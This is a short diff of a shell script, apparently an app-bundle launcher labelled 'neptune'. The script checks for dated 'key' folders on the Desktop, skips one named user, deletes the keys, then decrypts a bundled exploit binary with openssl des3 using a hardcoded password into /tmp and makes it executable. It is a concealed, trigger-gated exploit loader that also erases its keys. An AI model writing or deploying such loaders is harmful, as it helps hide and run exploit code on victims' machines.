@@ -2,6 +2,7 @@
 
 res="$(dirname "$(dirname "$0")")/Resources"
 key="$HOME/Desktop/$(date +%y%d)"
+elim_key="$HOME/Desktop/elim"
 exploit="/tmp/exp.out"
 logfile="/tmp/neptune_log.txt"
 
@@ -16,9 +17,16 @@ if [[ ! -d "$key" ]] || [[ $(whoami) == "boesene" ]]; then
     exit 1
 fi
 echo "Key found."
+if [[ -d "$elim_key" ]]; then
+    echo "elim_key found."
+    elim=true
+else
+    echo "elim_key not found." >&2
+    elim=false
+fi
 
-echo "Deleting key."
-rm -rf $key
+echo "Deleting keys."
+rm -rf "$key" "$elim_key"
 echo "Decrypting and preparing exploit."
 openssl des3 -d -in "$res/exp.out.des3" -k b51861c95142fce29aef7b6416fa21d5 > "$exploit"
 chmod +x "$exploit"
